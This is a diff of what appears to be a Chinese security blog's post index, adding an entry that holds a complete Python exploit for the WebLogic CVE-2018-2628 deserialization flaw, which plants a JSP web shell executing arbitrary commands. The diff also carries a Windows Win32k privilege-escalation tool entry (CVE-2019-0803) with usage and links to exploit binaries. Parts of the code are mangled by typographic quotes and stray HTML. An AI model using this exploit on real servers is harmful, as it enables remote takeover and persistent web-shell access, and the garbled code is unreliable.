-  </entry>
-  <entry>
-    <title>CVE-2019-0803提权工具</title>
-    <url>/p/fa25cc9b.html</url>
-    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x000 漏洞信息</strong></span><br>CVE-2019-0803 | Win32k 特权提升漏洞<br>发布时间: 2019-04-09<br>当 Win32k 组件无法正确处理内存中的对象时，Windows 中存在特权提升漏洞。成功利用此漏洞的攻击者可以在内核模式中运行任意代码。攻击者可随后安装程序；查看、更改或删除数据；或者创建拥有完全用户权限的新帐户。<br>若要利用此漏洞，攻击者首先必须登录到系统。然后，攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序，从而控制受影响的系统。</p>
-<p><span style="font-size: 18px;"><strong>0x001 影响版本</strong></span></p>
-<div class="cnblogs_Highlighter">
-<pre class="brush:csharp;gutter:true;">Microsoft Windows Server 2019 0
-Microsoft Windows Server 2016 0
-Microsoft Windows Server 2012 R2 0
-Microsoft Windows Server 2012 0
-Microsoft Windows Server 2008 R2 for x64-based Systems SP1
-Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1
-Microsoft Windows Server 2008 for x64-based Systems SP2
-Microsoft Windows Server 2008 for Itanium-based Systems SP2
-Microsoft Windows Server 2008 for 32-bit Systems SP2
-Microsoft Windows Server 1803 0
-Microsoft Windows Server 1709 0
-Microsoft Windows RT 8.1
-Microsoft Windows 8.1 for x64-based Systems 0
-Microsoft Windows 8.1 for 32-bit Systems 0
-Microsoft Windows 7 for x64-based Systems SP1
-Microsoft Windows 7 for 32-bit Systems SP1
-Microsoft Windows 10 Version 1809 for x64-based Systems 0
-Microsoft Windows 10 Version 1809 for ARM64-based Systems 0
-Microsoft Windows 10 Version 1809 for 32-bit Systems 0
-Microsoft Windows 10 Version 1803 for x64-based Systems 0
-Microsoft Windows 10 Version 1803 for ARM64-based Systems 0
-Microsoft Windows 10 Version 1803 for 32-bit Systems 0
-Microsoft Windows 10 version 1709 for x64-based Systems 0
-Microsoft Windows 10 Version 1709 for ARM64-based Systems 0
-Microsoft Windows 10 version 1709 for 32-bit Systems 0
-Microsoft Windows 10 version 1703 for x64-based Systems 0
-Microsoft Windows 10 version 1703 for 32-bit Systems 0
-Microsoft Windows 10 Version 1607 for x64-based Systems 0
-Microsoft Windows 10 Version 1607 for 32-bit Systems 0
-Microsoft Windows 10 for x64-based Systems 0
-Microsoft Windows 10 for 32-bit Systems 0
-</pre>
-</div>
-<p><span style="font-size: 18px;"><strong>&nbsp;0x002 EXP用法</strong></span></p>
-<div class="cnblogs_Highlighter">
-<pre class="brush:csharp;gutter:true;">Usage:  CVE-2019-0803.exe cmd cmdline
-</pre>
-</div>
-<p>如图：可能需执行3-4次左右才能提权成功,测试系统为Win7 X64,其它未测。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/CVE-2019-0803.png"></p>
-<p><span style="font-size: 18px;"><strong><span style="color: #ff00ff;">0x003 下载</span></strong></span></p>
-<p>https://github.com/k8gege/K8tools</p>
-<p><span style="font-size: 18px;"><strong>0x004 补丁</strong></span></p>
-<p>补丁号有很多个，不同的系统补丁号不一样，有时新的补丁包含旧洞补丁</p>
-<p>旧的补丁号会被替换掉，所以每次提权都应该先到官方查看下对应补丁号</p>
-<p>不要老是查询有没旧的补丁号，然后再去提权，没有旧的补丁号不代表没补</p>
-<p><a href="https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2019-0803" target="_blank">https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2019-0803</a></p>
-<p><span style="font-size: 18px;"><strong>0x005 链接</strong></span></p>
-<p><a href="https://www.exploit-db.com/exploits/46920" target="_blank">https://www.exploit-db.com/exploits/46920</a><br>(steal Security token) <a href="https://github.com/mwrlabs/CVE-2016-7255" target="_blank">https://github.com/mwrlabs/CVE-2016-7255</a><br>EDB Note: Download ~ <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46920.zip" target="_blank">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46920.zip</a></p>
-<p><a title="External url" href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0803" target="_blank">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0803</a> <br>                    
-
-
-
-<pre><code>&lt;a title=&quot;External url&quot; href=&quot;http://packetstormsecurity.com/files/153034/Microsoft-Windows-Win32k-Privilege-Escalation.html&quot; target=&quot;_blank&quot;&gt;http://packetstormsecurity.com/files/153034/Microsoft-Windows-Win32k-Privilege-Escalation.html&lt;/a&gt;&lt;/p&gt;</code></pre></p>]]></content>
-      <categories>
-        <category>提权</category>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>LPE</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CVE-2019-0604 SharePoint GetShell Exploit</title>
     <url>/p/e896a7d1.html</url>
     <content><![CDATA[<p><span style="font-size: 18px;"><strong>漏洞信息</strong></span></p>
@@ -3096,8 +2989,127 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
       <tags>
         <tag>Exp</tag>
         <tag>Tool</tag>
-        <tag>GetShell</tag>
         <tag>Code</tag>
+        <tag>GetShell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2018-2628 Weblogic GetShell Exploit</title>
+    <url>/p/b8e58f69.html</url>
+    <content><![CDATA[<h2 id="漏洞简介">漏洞简介</h2>
+<hr>
+<ul>
+<li>漏洞威胁：RCE--远程代码执行</li>
+<li>漏洞组件：weblogic</li>
+<li>影响版本：10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3</li>
+</ul>
+<h2 class="brush:python;gutter:true;"><br><strong>代码:</strong> </h2>
+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;"># -*- coding: utf-8 -*-
+# Oracle Weblogic Server (10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3) Deserialization Remote Command Execution Vulnerability (CVE-2018-2628)
+
+<p>from <strong>future</strong> import print_function</p>
+<p>import binascii<br>import os<br>import socket<br>import sys<br>import time</p>
+<p>def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):</p>
+<pre><code>#k8cmd weblogic http://192.11.22.67:7001/bea_wls_internal/wlscmd.jsp
+return &quot;aced00057372002f6f72672e6170616368652e636f6d6d6f6e732e66696c6575706c6f61642e6469736b2e4469736b46696c654974656d1f0d7226839a887103000a5a000b6973466f726d4669656c644a000473697a6549000d73697a655468726573686f6c645b000d636163686564436f6e74656e747400025b424c000b636f6e74656e74547970657400124c6a6176612f6c616e672f537472696e673b4c000864666f7346696c6574000e4c6a6176612f696f2f46696c653b4c00096669656c644e616d6571007e00024c000866696c654e616d6571007e00024c00076865616465727374002f4c6f72672f6170616368652f636f6d6d6f6e732f66696c6575706c6f61642f46696c654974656d486561646572733b4c000a7265706f7369746f727971007e0003787000ffffffffffffffff00000000757200025b42acf317f8060854e00200007870000002d43c25407061676520696d706f72743d226a6176612e696f2e2a22253e0d0a3c25407061676520696d706f72743d2273756e2e6d6973632e4241534536344465636f64657222253e0d0a3c250d0a747279207b0d0a537472696e6720636d64203d20726571756573742e676574506172616d657465722822746f6d22293b0d0a537472696e6720706174683d6170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574526571756573745552492829293b0d0a537472696e67206469723d227765626c6f676963223b0d0a696628636d642e657175616c7328224e7a55314e672229297b6f75742e7072696e7428225b535d222b6469722b225b455d22293b7d0d0a627974655b5d2062696e617279203d204241534536344465636f6465722e636c6173732e6e6577496e7374616e636528292e6465636f646542756666657228636d64293b0d0a537472696e67206b636d64203d206e657720537472696e672862696e617279293b0d0a50726f63657373206368696c64203d2052756e74696d652e67657452756e74696d6528292e65786563286b636d64293b0d0a496e70757453747265616d20696e203d206368696c642e676574496e70757453747265616d28293b0d0a6f75742e7072696e7428222d3e7c22293b0d0a696e7420633b0d0a7768696c6520282863203d20696e2e7265616428292920213d202d3129207b0d0a6f75742e7072696e742828636861722963293b0d0a7d0d0a696e2e636c6f736528293b0d0a6f75742e7072696e7428227c3c2d22293b0d0a747279207b0d0a6368696c642e77616974466f7228293b0d0a7d2063617463682028496e746572727570746564457863657074696f6e206529207b0d0a652e7072696e74537461636b547261636528293b0d0a7d0d0a7d2063617463682028494f457863657074696f6e206529207b0d0a53797374656d2e6572722e7072696e746c6e2865293b0d0a7d0d0a253e7400186170706c69636174696f6e2f6f637465742d73747265616d707400047465737471007e0009707372000c6a6176612e696f2e46696c65042da4450e0de4ff0300014c00047061746871007e0002787074004d736572766572735c41646d696e5365727665725c746d705c5f574c5f696e7465726e616c5c6265615f776c735f696e7465726e616c5c396a3464716b5c7761725c776c73636d642e6a7370c0807702005c7878&quot;</code></pre><p>def t3_handshake(sock, server_addr):<br>    sock.connect(server_addr)<br>    sock.send(‘74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a’.decode(‘hex’))<br>    time.sleep(1)<br>    sock.recv(1024)<br>    print(‘handshake successful’)</p>
+<p>def build_t3_request_object(sock, port):<br>    data1 = ‘000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371’<br>    data2 = ‘007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07’.format(‘{:04x}’.format(dport))<br>    data3 = ‘1a7727000d3234322e323134’<br>    data4 = ‘2e312e32353461863d1d0000000078’<br>    for d in [data1,data2,data3,data4]:<br>        sock.send(d.decode(‘hex’))<br>    time.sleep(2)<br>    print(‘send request payload successful,recv length:%d’%(len(sock.recv(2048))))</p>
+<p>def send_payload_objdata(sock, data):<br>    payload=’056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000’<br>    payload+=data<br>    payload+=’fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff’<br>    payload = ‘%s%s’%(‘{:08x}’.format(len(payload)/2 + 4),payload)<br>    sock.send(payload.decode(‘hex’))<br>    time.sleep(2)<br>    sock.send(payload.decode(‘hex’))<br>    res = ‘’<br>    try:<br>        while True:<br>            res += sock.recv(4096)<br>            time.sleep(0.1)<br>    except Exception:<br>        pass<br>    return res</p>
+<p>def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):<br>    print(‘——————————————–’)<br>    print(‘Weblogic GetShell Exploit for CVE-2018-2628’)<br>    print(‘by k8gege build 20180426’)<br>    print(‘——————————————–’)<br>    print(“sending payload”);<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.settimeout(8)<br>    server_addr = (dip, dport)<br>    t3_handshake(sock, server_addr)<br>    build_t3_request_object(sock, dport)<br>    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</p>
+<pre><code>rs=send_payload_objdata(sock, payload)
+#print(&apos;response: &apos; + rs)
+print(&apos;exploit completed!&apos;)
+print(&apos;shell: http://&apos;+dip+&apos;:&apos;+str(dport)+&quot;/bea_wls_internal/wlscmd.jsp&quot;)
+print(&apos;Please use the k8fly connection shell&apos;)</code></pre><p>if <strong>name</strong>==”<strong>main</strong>“:<br>    if len(sys.argv) != 3:<br>        print(‘——————————————–’)<br>        print(‘Weblogic GetShell Exploit for CVE-2018-2628’)<br>        print(‘by k8gege build 20180426’)<br>        print(‘Usage: exploit [weblogic ip] [weblogic port]’)<br>        print(‘——————————————–’)<br>        sys.exit()</p>
+<pre><code>dip = sys.argv[1]
+dport = int(sys.argv[2])
+exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</code></pre><p></p></pre><p></p>
+</div>
+<h2>&nbsp;演示:</h2>
+<p><img alt data-original="http://k8gege.org/k8img/posts/cve-2018-2628.png"></p>
+<h2>附件说明:</h2>
+<p><strong>0x001 .net版</strong><br>exp功能<br>1 探测weblogic版本<br>2 GetShell<br><br>运行环境 .net 2.0<br><br><strong>0x002 python版</strong><br>Exp-2018-2628.exe 附python代码<br>Poc-2018-2628.exe 仅检测是否存在漏洞</p>
+<p>链接: <a href="https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar</a></p>
+<p>&nbsp;</p>]]></content>
+      <categories>
+        <category>Exp</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>GetShell</tag>
+        <tag>Weblogic</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2019-0803提权工具</title>
+    <url>/p/fa25cc9b.html</url>
+    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x000 漏洞信息</strong></span><br>CVE-2019-0803 | Win32k 特权提升漏洞<br>发布时间: 2019-04-09<br>当 Win32k 组件无法正确处理内存中的对象时，Windows 中存在特权提升漏洞。成功利用此漏洞的攻击者可以在内核模式中运行任意代码。攻击者可随后安装程序；查看、更改或删除数据；或者创建拥有完全用户权限的新帐户。<br>若要利用此漏洞，攻击者首先必须登录到系统。然后，攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序，从而控制受影响的系统。</p>
+<p><span style="font-size: 18px;"><strong>0x001 影响版本</strong></span></p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:csharp;gutter:true;">Microsoft Windows Server 2019 0
+Microsoft Windows Server 2016 0
+Microsoft Windows Server 2012 R2 0
+Microsoft Windows Server 2012 0
+Microsoft Windows Server 2008 R2 for x64-based Systems SP1
+Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1
+Microsoft Windows Server 2008 for x64-based Systems SP2
+Microsoft Windows Server 2008 for Itanium-based Systems SP2
+Microsoft Windows Server 2008 for 32-bit Systems SP2
+Microsoft Windows Server 1803 0
+Microsoft Windows Server 1709 0
+Microsoft Windows RT 8.1
+Microsoft Windows 8.1 for x64-based Systems 0
+Microsoft Windows 8.1 for 32-bit Systems 0
+Microsoft Windows 7 for x64-based Systems SP1
+Microsoft Windows 7 for 32-bit Systems SP1
+Microsoft Windows 10 Version 1809 for x64-based Systems 0
+Microsoft Windows 10 Version 1809 for ARM64-based Systems 0
+Microsoft Windows 10 Version 1809 for 32-bit Systems 0
+Microsoft Windows 10 Version 1803 for x64-based Systems 0
+Microsoft Windows 10 Version 1803 for ARM64-based Systems 0
+Microsoft Windows 10 Version 1803 for 32-bit Systems 0
+Microsoft Windows 10 version 1709 for x64-based Systems 0
+Microsoft Windows 10 Version 1709 for ARM64-based Systems 0
+Microsoft Windows 10 version 1709 for 32-bit Systems 0
+Microsoft Windows 10 version 1703 for x64-based Systems 0
+Microsoft Windows 10 version 1703 for 32-bit Systems 0
+Microsoft Windows 10 Version 1607 for x64-based Systems 0
+Microsoft Windows 10 Version 1607 for 32-bit Systems 0
+Microsoft Windows 10 for x64-based Systems 0
+Microsoft Windows 10 for 32-bit Systems 0
+</pre>
+</div>
+<p><span style="font-size: 18px;"><strong>&nbsp;0x002 EXP用法</strong></span></p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:csharp;gutter:true;">Usage:  CVE-2019-0803.exe cmd cmdline
+</pre>
+</div>
+<p>如图：可能需执行3-4次左右才能提权成功,测试系统为Win7 X64,其它未测。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/CVE-2019-0803.png"></p>
+<p><span style="font-size: 18px;"><strong><span style="color: #ff00ff;">0x003 下载</span></strong></span></p>
+<p>https://github.com/k8gege/K8tools</p>
+<p><span style="font-size: 18px;"><strong>0x004 补丁</strong></span></p>
+<p>补丁号有很多个，不同的系统补丁号不一样，有时新的补丁包含旧洞补丁</p>
+<p>旧的补丁号会被替换掉，所以每次提权都应该先到官方查看下对应补丁号</p>
+<p>不要老是查询有没旧的补丁号，然后再去提权，没有旧的补丁号不代表没补</p>
+<p><a href="https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2019-0803" target="_blank">https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2019-0803</a></p>
+<p><span style="font-size: 18px;"><strong>0x005 链接</strong></span></p>
+<p><a href="https://www.exploit-db.com/exploits/46920" target="_blank">https://www.exploit-db.com/exploits/46920</a><br>(steal Security token) <a href="https://github.com/mwrlabs/CVE-2016-7255" target="_blank">https://github.com/mwrlabs/CVE-2016-7255</a><br>EDB Note: Download ~ <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46920.zip" target="_blank">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46920.zip</a></p>
+<p><a title="External url" href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0803" target="_blank">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0803</a> <br>                    
+
+
+
+<pre><code>&lt;a title=&quot;External url&quot; href=&quot;http://packetstormsecurity.com/files/153034/Microsoft-Windows-Win32k-Privilege-Escalation.html&quot; target=&quot;_blank&quot;&gt;http://packetstormsecurity.com/files/153034/Microsoft-Windows-Win32k-Privilege-Escalation.html&lt;/a&gt;&lt;/p&gt;</code></pre></p>]]></content>
+      <categories>
+        <category>提权</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>LPE</tag>
       </tags>
   </entry>
   <entry>
@@ -3772,8 +3784,8 @@ from pprint import pprint
         <category>内网</category>
         <category>Python</category>
         <category>源码</category>
-        <category>嗅探</category>
         <category>编程</category>
+        <category>嗅探</category>
       </categories>
       <tags>
         <tag>Tool</tag>
